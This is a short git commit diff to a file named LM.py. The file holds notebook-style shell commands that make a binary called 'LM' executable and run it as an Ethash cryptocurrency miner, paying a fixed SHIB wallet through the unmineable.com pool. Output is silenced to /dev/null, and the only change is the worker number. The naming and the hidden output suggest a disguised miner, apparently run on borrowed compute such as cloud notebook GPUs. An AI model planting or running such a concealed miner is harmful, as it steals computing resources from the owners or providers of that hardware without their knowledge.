2d373565e4c30b8b6acc9a981cbcc3bd50dbf96b
mencobaiajanah <86476551+mencobaiajanah@users.noreply.github.com>
2021-06-30 01:04:21 +0800

    Update LM.py

--- LM.py
+++ LM.py
@@ -1,2 +1,2 @@
 ! chmod +x LM
-! ./LM --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6e890745813facaeab2afab23440a04f6b55034a.GPU-9#fg38-pfgk > /dev/null
+! ./LM --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x6e890745813facaeab2afab23440a04f6b55034a.GPU-10#fg38-pfgk > /dev/null
